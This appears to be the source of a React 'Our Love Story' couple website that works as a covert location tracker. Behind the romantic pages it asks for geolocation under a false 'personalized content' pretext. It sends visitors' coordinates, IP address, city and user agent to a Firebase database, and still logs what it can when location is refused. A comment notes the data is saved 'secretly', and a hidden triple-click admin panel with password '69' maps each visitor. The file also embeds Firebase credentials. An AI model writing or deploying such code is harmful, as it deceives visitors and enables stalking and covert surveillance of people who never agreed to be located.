import React, { useState, useEffect } from 'react';
import { Heart, MapPin, Users, Calendar, Camera, Gift, Star, Lock, Eye, EyeOff, Trash2, Edit3, Save, X, Upload, Image as ImageIcon, Menu, ChevronDown } from 'lucide-react';

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyCuKeS4djQ-b8Lpj3Hr_92Qu2kUugeeR4c",
  authDomain: "spinstrike-bd.firebaseapp.com",
  databaseURL: "https://spinstrike-bd-default-rtdb.firebaseio.com",
  projectId: "spinstrike-bd",
  storageBucket: "spinstrike-bd.firebasestorage.app",
  messagingSenderId: "178535326334",
  appId: "1:178535326334:web:f4bbc2afa6b5b1ac9b6e2f",
};

interface VisitorData {
  id?: string;
  latitude: number;
  longitude: number;
  ipAddress: string;
  userAgent: string;
  timestamp: string;
  country?: string;
  city?: string;
}

interface AdminData {
  coupleNames: string;
  relationshipDate: string;
  story: string;
  favoriteMemory: string;
  heroImage: string;
  aboutImage: string;
  galleryImages: string[];
  backgroundColor: string;
  textColor: string;
  accentColor: string;
  websiteTitle: string;
  heroSubtitle: string;
  aboutTitle: string;
  galleryTitle: string;
  footerText: string;
}

function App() {
  const [hasAcceptedLocation, setHasAcceptedLocation] = useState(false);
  const [showLocationPrompt, setShowLocationPrompt] = useState(true);
  const [visitorData, setVisitorData] = useState<VisitorData[]>([]);
  const [showAdmin, setShowAdmin] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
  const [showDataViewer, setShowDataViewer] = useState(false);
  const [showMapTool, setShowMapTool] = useState(false);
  const [showImageManager, setShowImageManager] = useState(false);
  const [mapLat, setMapLat] = useState('');
  const [mapLng, setMapLng] = useState('');
  const [mapLink, setMapLink] = useState('');
  const [editMode, setEditMode] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [newImageUrl, setNewImageUrl] = useState('');
  const [adminData, setAdminData] = useState<AdminData>({
    coupleNames: "Alex & Jordan",
    relationshipDate: "June 15, 2020",
    story: "We met at a coffee shop on a rainy Tuesday morning. What started as a chance encounter over spilled coffee became the most beautiful love story we could have ever imagined.",
    favoriteMemory: "Our first trip to Paris, where we got engaged under the Eiffel Tower at sunset.",
    heroImage: "https://images.pexels.com/photos/1024993/pexels-photo-1024993.jpeg?auto=compress&cs=tinysrgb&w=800",
    aboutImage: "https://images.pexels.com/photos/1024998/pexels-photo-1024998.jpeg?auto=compress&cs=tinysrgb&w=800",
    galleryImages: [
      "https://images.pexels.com/photos/1024993/pexels-photo-1024993.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1024998/pexels-photo-1024998.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1025002/pexels-photo-1025002.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1024999/pexels-photo-1024999.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1025000/pexels-photo-1025000.jpeg?auto=compress&cs=tinysrgb&w=400",
      "https://images.pexels.com/photos/1025001/pexels-photo-1025001.jpeg?auto=compress&cs=tinysrgb&w=400"
    ],
    backgroundColor: "from-pink-50 via-purple-50 to-indigo-50",
    textColor: "text-gray-800",
    accentColor: "from-pink-500 to-purple-500",
    websiteTitle: "Our Love Story 💕",
    heroSubtitle: "Together Forever",
    aboutTitle: "Our Love Story",
    galleryTitle: "Our Memories",
    footerText: "Thank you for being part of our love story! 💕"
  });

  // Initialize Firebase
  useEffect(() => {
    const script = document.createElement('script');
    script.type = 'module';
    script.innerHTML = `
      import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js';
      import { getDatabase, ref, push, onValue, remove } from 'https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js';
      
      const app = initializeApp(${JSON.stringify(firebaseConfig)});
      window.firebaseDb = getDatabase(app);
      window.firebaseRef = ref;
      window.firebasePush = push;
      window.firebaseOnValue = onValue;
      window.firebaseRemove = remove;
    `;
    document.head.appendChild(script);
  }, []);

  // Get IP address
  const getIPAddress = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.log('Could not fetch IP');
      return 'Unknown';
    }
  };

  // Get location details from IP
  const getLocationFromIP = async (ip: string) => {
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();
      return {
        country: data.country_name || 'Unknown',
        city: data.city || 'Unknown'
      };
    } catch (error) {
      return { country: 'Unknown', city: 'Unknown' };
    }
  };

  // Save visitor data to Firebase
  const saveVisitorData = async (latitude: number, longitude: number) => {
    try {
      const ip = await getIPAddress();
      const locationData = await getLocationFromIP(ip);
      
      const visitorInfo: VisitorData = {
        latitude,
        longitude,
        ipAddress: ip,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        country: locationData.country,
        city: locationData.city
      };

      if (window.firebaseDb && window.firebasePush && window.firebaseRef) {
        const visitorsRef = window.firebaseRef(window.firebaseDb, 'visitors');
        await window.firebasePush(visitorsRef, visitorInfo);
        console.log('Visitor data saved secretly 🕵️');
      }
    } catch (error) {
      console.error('Error saving visitor data:', error);
    }
  };

  // Request location permission
  const requestLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          saveVisitorData(position.coords.latitude, position.coords.longitude);
          setHasAcceptedLocation(true);
          setShowLocationPrompt(false);
        },
        (error) => {
          console.log('Location denied');
          setShowLocationPrompt(false);
          setHasAcceptedLocation(true);
          // Still save what we can
          saveVisitorData(0, 0);
        }
      );
    } else {
      setShowLocationPrompt(false);
      setHasAcceptedLocation(true);
      saveVisitorData(0, 0);
    }
  };

  // Load visitor data for admin
  const loadVisitorData = () => {
    if (window.firebaseDb && window.firebaseOnValue && window.firebaseRef) {
      const visitorsRef = window.firebaseRef(window.firebaseDb, 'visitors');
      window.firebaseOnValue(visitorsRef, (snapshot: any) => {
        const data = snapshot.val();
        if (data) {
          const visitors = Object.keys(data).map(key => ({
            id: key,
            ...data[key]
          }));
          setVisitorData(visitors);
        }
      });
    }
  };

  // Delete visitor data
  const deleteVisitorData = async (id: string) => {
    if (window.firebaseDb && window.firebaseRemove && window.firebaseRef) {
      const visitorRef = window.firebaseRef(window.firebaseDb, `visitors/${id}`);
      await window.firebaseRemove(visitorRef);
    }
  };

  // Admin authentication
  const handleAdminLogin = () => {
    if (adminPassword === '69') {
      setIsAdminAuthenticated(true);
      loadVisitorData();
    } else {
      alert('Wrong password!');
    }
  };

  // Generate map link
  const generateMapLink = () => {
    if (mapLat && mapLng) {
      const url = `https://www.google.com/maps/search/${mapLat},${mapLng}`;
      setMapLink(url);
    }
  };

  // Add image to gallery
  const addImageToGallery = () => {
    if (newImageUrl.trim()) {
      setAdminData({
        ...adminData,
        galleryImages: [...adminData.galleryImages, newImageUrl.trim()]
      });
      setNewImageUrl('');
    }
  };

  // Remove image from gallery
  const removeImageFromGallery = (index: number) => {
    const updatedImages = adminData.galleryImages.filter((_, i) => i !== index);
    setAdminData({
      ...adminData,
      galleryImages: updatedImages
    });
  };

  // Auto-request location on page load
  useEffect(() => {
    const timer = setTimeout(() => {
      if (showLocationPrompt) {
        requestLocation();
      }
    }, 2000);
    return () => clearTimeout(timer);
  }, [showLocationPrompt]);

  // Location permission prompt
  if (showLocationPrompt) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-pink-400 via-purple-500 to-indigo-600 flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-8 max-w-md w-full text-center transform animate-pulse">
          <div className="mb-6">
            <MapPin className="w-12 h-12 sm:w-16 sm:h-16 text-pink-500 mx-auto mb-4" />
            <h2 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2">Welcome to Our Love Story! 💕</h2>
            <p className="text-sm sm:text-base text-gray-600">
              We'd love to share our journey with you! Please allow location access to see personalized content based on your area.
            </p>
          </div>
          <button
            onClick={requestLocation}
            className="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white font-semibold py-3 px-6 rounded-full hover:from-pink-600 hover:to-purple-700 transition-all duration-300 transform hover:scale-105 text-sm sm:text-base"
          >
            Allow Location & Continue 🌍
          </button>
          <p className="text-xs text-gray-500 mt-4">
            This helps us show you the most relevant content
          </p>
        </div>
      </div>
    );
  }

  // Admin panel
  if (showAdmin && !isAdminAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-6 sm:p-8 max-w-md w-full">
          <div className="text-center mb-6">
            <Lock className="w-10 h-10 sm:w-12 sm:h-12 text-gray-600 mx-auto mb-4" />
            <h2 className="text-xl sm:text-2xl font-bold text-gray-800">Admin Access</h2>
          </div>
          <input
            type="password"
            value={adminPassword}
            onChange={(e) => setAdminPassword(e.target.value)}
            placeholder="Enter admin password"
            className="w-full p-3 border border-gray-300 rounded-lg mb-4 focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm sm:text-base"
            onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin()}
          />
          <button
            onClick={handleAdminLogin}
            className="w-full bg-blue-600 text-white font-semibold py-3 rounded-lg hover:bg-blue-700 transition-colors text-sm sm:text-base"
          >
            Login
          </button>
          <button
            onClick={() => setShowAdmin(false)}
            className="w-full mt-2 text-gray-600 hover:text-gray-800 transition-colors text-sm sm:text-base"
          >
            Back to Website
          </button>
        </div>
      </div>
    );
  }

  // Admin dashboard
  if (showAdmin && isAdminAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-100 p-2 sm:p-4">
        <div className="max-w-7xl mx-auto">
          <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6 mb-6">
            {/* Mobile Admin Header */}
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
              <h1 className="text-2xl sm:text-3xl font-bold text-gray-800">Admin Dashboard</h1>
              
              {/* Mobile Menu Button */}
              <div className="sm:hidden w-full">
                <button
                  onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                  className="w-full flex items-center justify-between px-4 py-2 bg-gray-100 rounded-lg"
                >
                  <span>Admin Tools</span>
                  <ChevronDown className={`w-4 h-4 transition-transform ${mobileMenuOpen ? 'rotate-180' : ''}`} />
                </button>
              </div>

              {/* Desktop Buttons */}
              <div className="hidden sm:flex gap-2 flex-wrap">
                <button
                  onClick={() => setShowDataViewer(!showDataViewer)}
                  className="px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2 text-sm"
                >
                  <Eye className="w-4 h-4" />
                  {showDataViewer ? 'Hide' : 'Show'} Data
                </button>
                <button
                  onClick={() => setShowMapTool(!showMapTool)}
                  className="px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors flex items-center gap-2 text-sm"
                >
                  <MapPin className="w-4 h-4" />
                  Map Tool
                </button>
                <button
                  onClick={() => setShowImageManager(!showImageManager)}
                  className="px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2 text-sm"
                >
                  <ImageIcon className="w-4 h-4" />
                  Images
                </button>
                <button
                  onClick={() => setEditMode(!editMode)}
                  className="px-3 py-2 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors flex items-center gap-2 text-sm"
                >
                  <Edit3 className="w-4 h-4" />
                  {editMode ? 'View' : 'Edit'}
                </button>
                <button
                  onClick={() => {
                    setShowAdmin(false);
                    setIsAdminAuthenticated(false);
                    setAdminPassword('');
                  }}
                  className="px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors text-sm"
                >
                  Logout
                </button>
              </div>
            </div>

            {/* Mobile Menu */}
            {mobileMenuOpen && (
              <div className="sm:hidden mb-6 space-y-2">
                <button
                  onClick={() => {
                    setShowDataViewer(!showDataViewer);
                    setMobileMenuOpen(false);
                  }}
                  className="w-full px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2"
                >
                  <Eye className="w-4 h-4" />
                  {showDataViewer ? 'Hide' : 'Show'} Visitor Data
                </button>
                <button
                  onClick={() => {
                    setShowMapTool(!showMapTool);
                    setMobileMenuOpen(false);
                  }}
                  className="w-full px-4 py-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors flex items-center gap-2"
                >
                  <MapPin className="w-4 h-4" />
                  Map Tool
                </button>
                <button
                  onClick={() => {
                    setShowImageManager(!showImageManager);
                    setMobileMenuOpen(false);
                  }}
                  className="w-full px-4 py-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2"
                >
                  <ImageIcon className="w-4 h-4" />
                  Image Manager
                </button>
                <button
                  onClick={() => {
                    setEditMode(!editMode);
                    setMobileMenuOpen(false);
                  }}
                  className="w-full px-4 py-3 bg-orange-600 text-white rounded-lg hover:bg-orange-700 transition-colors flex items-center gap-2"
                >
                  <Edit3 className="w-4 h-4" />
                  {editMode ? 'View Mode' : 'Edit Content'}
                </button>
                <button
                  onClick={() => {
                    setShowAdmin(false);
                    setIsAdminAuthenticated(false);
                    setAdminPassword('');
                  }}
                  className="w-full px-4 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors"
                >
                  Logout
                </button>
              </div>
            )}

            {/* Content Editor */}
            {editMode && (
              <div className="mb-6 p-4 bg-gray-50 rounded-lg">
                <h3 className="text-lg sm:text-xl font-bold mb-4">Edit Website Content</h3>
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium mb-2">Website Title</label>
                    <input
                      type="text"
                      value={adminData.websiteTitle}
                      onChange={(e) => setAdminData({...adminData, websiteTitle: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">Couple Names</label>
                    <input
                      type="text"
                      value={adminData.coupleNames}
                      onChange={(e) => setAdminData({...adminData, coupleNames: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">Relationship Date</label>
                    <input
                      type="text"
                      value={adminData.relationshipDate}
                      onChange={(e) => setAdminData({...adminData, relationshipDate: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">Hero Subtitle</label>
                    <input
                      type="text"
                      value={adminData.heroSubtitle}
                      onChange={(e) => setAdminData({...adminData, heroSubtitle: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">Hero Image URL</label>
                    <input
                      type="url"
                      value={adminData.heroImage}
                      onChange={(e) => setAdminData({...adminData, heroImage: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium mb-2">About Image URL</label>
                    <input
                      type="url"
                      value={adminData.aboutImage}
                      onChange={(e) => setAdminData({...adminData, aboutImage: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                  <div className="lg:col-span-2">
                    <label className="block text-sm font-medium mb-2">Our Story</label>
                    <textarea
                      value={adminData.story}
                      onChange={(e) => setAdminData({...adminData, story: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg h-24 text-sm"
                    />
                  </div>
                  <div className="lg:col-span-2">
                    <label className="block text-sm font-medium mb-2">Favorite Memory</label>
                    <textarea
                      value={adminData.favoriteMemory}
                      onChange={(e) => setAdminData({...adminData, favoriteMemory: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg h-24 text-sm"
                    />
                  </div>
                  <div className="lg:col-span-2">
                    <label className="block text-sm font-medium mb-2">Footer Text</label>
                    <input
                      type="text"
                      value={adminData.footerText}
                      onChange={(e) => setAdminData({...adminData, footerText: e.target.value})}
                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
                    />
                  </div>
                </div>
              </div>
            )}

            {/* Image Manager */}
            {showImageManager && (
              <div className="mb-6 p-4 bg-purple-50 rounded-lg">
                <h3 className="text-lg sm:text-xl font-bold mb-4">🖼️ Image Manager</h3>
                
                {/* Add New Image */}
                <div className="mb-6">
                  <label className="block text-sm font-medium mb-2">Add New Image to Gallery</label>
                  <div className="flex flex-col sm:flex-row gap-2">
                    <input
                      type="url"
                      placeholder="Enter image URL"
                      value={newImageUrl}
                      onChange={(e) => setNewImageUrl(e.target.value)}
                      className="flex-1 p-2 border border-gray-300 rounded-lg text-sm"
                    />
                    <button
                      onClick={addImageToGallery}
                      className="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition-colors flex items-center gap-2 justify-center"
                    >
                      <Upload className="w-4 h-4" />
                      Add Image
                    </button>
                  </div>
                </div>

                {/* Gallery Images */}
                <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
                  {adminData.galleryImages.map((image, index) => (
                    <div key={index} className="relative group">
                      <img
                        src={image}
                        alt={`Gallery ${index + 1}`}
                        className="w-full h-24 sm:h-32 object-cover rounded-lg"
                      />
                      <button
                        onClick={() => removeImageFromGallery(index)}
                        className="absolute top-1 right-1 bg-red-500 text-white rounded-full p-1 opacity-0 group-hover:opacity-100 transition-opacity"
                      >
                        <X className="w-3 h-3" />
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Map Tool */}
            {showMapTool && (
              <div className="mb-6 p-4 bg-blue-50 rounded-lg">
                <h3 className="text-lg sm:text-xl font-bold mb-4">🌍 Map Location Tool</h3>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  <input
                    type="text"
                    placeholder="Latitude"
                    value={mapLat}
                    onChange={(e) => setMapLat(e.target.value)}
                    className="p-2 border border-gray-300 rounded-lg text-sm"
                  />
                  <input
                    type="text"
                    placeholder="Longitude"
                    value={mapLng}
                    onChange={(e) => setMapLng(e.target.value)}
                    className="p-2 border border-gray-300 rounded-lg text-sm"
                  />
                  <button
                    onClick={generateMapLink}
                    className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors text-sm"
                  >
                    Generate Map Link
                  </button>
                </div>
                {mapLink && (
                  <div className="mt-4">
                    <a
                      href={mapLink}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="inline-block px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors text-sm"
                    >
                      🌎 Open in Google Maps
                    </a>
                  </div>
                )}
              </div>
            )}

            {/* Visitor Data */}
            {showDataViewer && (
              <div className="mb-6">
                <h3 className="text-lg sm:text-xl font-bold mb-4">Visitor Data ({visitorData.length} visitors)</h3>
                <div className="overflow-x-auto">
                  <table className="w-full border border-gray-300 rounded-lg text-xs sm:text-sm">
                    <thead className="bg-gray-50">
                      <tr>
                        <th className="p-2 text-left">Timestamp</th>
                        <th className="p-2 text-left">IP Address</th>
                        <th className="p-2 text-left">Location</th>
                        <th className="p-2 text-left">Coordinates</th>
                        <th className="p-2 text-left">Country/City</th>
                        <th className="p-2 text-left">Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {visitorData.map((visitor) => (
                        <tr key={visitor.id} className="border-t">
                          <td className="p-2">{new Date(visitor.timestamp).toLocaleString()}</td>
                          <td className="p-2 font-mono">{visitor.ipAddress}</td>
                          <td className="p-2">
                            <a
                              href={`https://www.google.com/maps/search/${visitor.latitude},${visitor.longitude}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="text-blue-600 hover:underline"
                            >
                              View Map
                            </a>
                          </td>
                          <td className="p-2 font-mono">
                            {visitor.latitude.toFixed(4)}, {visitor.longitude.toFixed(4)}
                          </td>
                          <td className="p-2">{visitor.country}, {visitor.city}</td>
                          <td className="p-2">
                            <button
                              onClick={() => visitor.id && deleteVisitorData(visitor.id)}
                              className="text-red-600 hover:text-red-800 transition-colors"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    );
  }

  // Main couple website
  return (
    <div className={`min-h-screen bg-gradient-to-br ${adminData.backgroundColor}`}>
      {/* Secret admin access - triple click on heart */}
      <div 
        className="fixed top-4 right-4 z-50 cursor-pointer"
        onClick={(e) => {
          if (e.detail === 3) { // Triple click
            setShowAdmin(true);
          }
        }}
      >
        <Heart className="w-6 h-6 sm:w-8 sm:h-8 text-pink-500 hover:text-pink-600 transition-colors" />
      </div>

      {/* Hero Section */}
      <section className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden">
        {/* Background Image */}
        <div 
          className="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-20"
          style={{ backgroundImage: `url(${adminData.heroImage})` }}
        ></div>
        
        <div className="text-center max-w-4xl mx-auto relative z-10">
          <div className="mb-6 sm:mb-8 animate-bounce">
            <Heart className="w-16 h-16 sm:w-20 sm:h-20 text-pink-500 mx-auto mb-4" />
          </div>
          <h1 className="text-4xl sm:text-6xl md:text-8xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 mb-4 sm:mb-6">
            {adminData.coupleNames}
          </h1>
          <p className="text-lg sm:text-2xl md:text-3xl text-gray-700 mb-6 sm:mb-8">
            {adminData.heroSubtitle}
          </p>
          <p className="text-base sm:text-xl text-gray-600 mb-8 sm:mb-12">
            Together since {adminData.relationshipDate}
          </p>
          <div className="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-4 mb-8 sm:mb-12">
            <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
              <span className="text-pink-600 font-semibold text-sm sm:text-base">💕 In Love</span>
            </div>
            <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
              <span className="text-purple-600 font-semibold text-sm sm:text-base">🌟 Forever</span>
            </div>
            <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
              <span className="text-indigo-600 font-semibold text-sm sm:text-base">🎉 Happy</span>
            </div>
          </div>
        </div>
      </section>

      {/* Our Story Section */}
      <section className="py-12 sm:py-20 px-4">
        <div className="max-w-6xl mx-auto">
          <div className="text-center mb-12 sm:mb-16">
            <h2 className="text-3xl sm:text-5xl font-bold text-gray-800 mb-4 sm:mb-6">{adminData.aboutTitle}</h2>
            <div className={`w-24 h-1 bg-gradient-to-r ${adminData.accentColor} mx-auto`}></div>
          </div>
          
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 sm:gap-12 items-center">
            <div className="space-y-6">
              <div className="bg-white/80 backdrop-blur-sm rounded-3xl p-6 sm:p-8 shadow-xl">
                <Users className="w-10 h-10 sm:w-12 sm:h-12 text-pink-500 mb-4" />
                <h3 className="text-xl sm:text-2xl font-bold text-gray-800 mb-4">How We Met</h3>
                <p className="text-gray-600 leading-relaxed text-sm sm:text-base">
                  {adminData.story}
                </p>
              </div>
              
              <div className="bg-white/80 backdrop-blur-sm rounded-3xl p-6 sm:p-8 shadow-xl">
                <Star className="w-10 h-10 sm:w-12 sm:h-12 text-purple-500 mb-4" />
                <h3 className="text-xl sm:text-2xl font-bold text-gray-800 mb-4">Favorite Memory</h3>
                <p className="text-gray-600 leading-relaxed text-sm sm:text-base">
                  {adminData.favoriteMemory}
                </p>
              </div>
            </div>
            
            <div className="relative">
              <img
                src={adminData.aboutImage}
                alt="Couple"
                className="rounded-3xl shadow-2xl w-full h-64 sm:h-96 object-cover"
              />
              <div className="absolute -bottom-4 -right-4 sm:-bottom-6 sm:-right-6 bg-gradient-to-r from-pink-500 to-purple-500 rounded-3xl p-4 sm:p-6 shadow-xl">
                <Calendar className="w-6 h-6 sm:w-8 sm:h-8 text-white mb-2" />
                <p className="text-white font-semibold text-sm">Together for</p>
                <p className="text-white text-lg sm:text-2xl font-bold">
                  {Math.floor((new Date().getTime() - new Date('2020-06-15').getTime()) / (1000 * 60 * 60 * 24))} days
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Memories Gallery */}
      <section className="py-12 sm:py-20 px-4 bg-white/50">
        <div className="max-w-6xl mx-auto">
          <div className="text-center mb-12 sm:mb-16">
            <h2 className="text-3xl sm:text-5xl font-bold text-gray-800 mb-4 sm:mb-6">{adminData.galleryTitle}</h2>
            <div className={`w-24 h-1 bg-gradient-to-r ${adminData.accentColor} mx-auto`}></div>
          </div>
          
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-8">
            {adminData.galleryImages.map((image, index) => (
              <div key={index} className="group relative overflow-hidden rounded-3xl shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:-translate-y-2">
                <img
                  src={image}
                  alt={`Memory ${index + 1}`}
                  className="w-full h-48 sm:h-64 object-cover group-hover:scale-110 transition-transform duration-300"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300">
                  <div className="absolute bottom-4 left-4">
                    <h3 className="text-white text-lg sm:text-xl font-bold">Memory {index + 1}</h3>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className={`py-8 sm:py-12 px-4 bg-gradient-to-r ${adminData.accentColor}`}>
        <div className="max-w-4xl mx-auto text-center">
          <Heart className="w-10 h-10 sm:w-12 sm:h-12 text-white mx-auto mb-4" />
          <h3 className="text-2xl sm:text-3xl font-bold text-white mb-4">Forever & Always</h3>
          <p className="text-white/90 text-base sm:text-lg">
            {adminData.footerText}
          </p>
          <div className="mt-6 sm:mt-8 flex justify-center space-x-6">
            <Camera className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
            <Gift className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
            <Star className="w-6 h-6 sm:w-8 sm:h-8 text-white/80 hover:text-white cursor-pointer transition-colors" />
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;
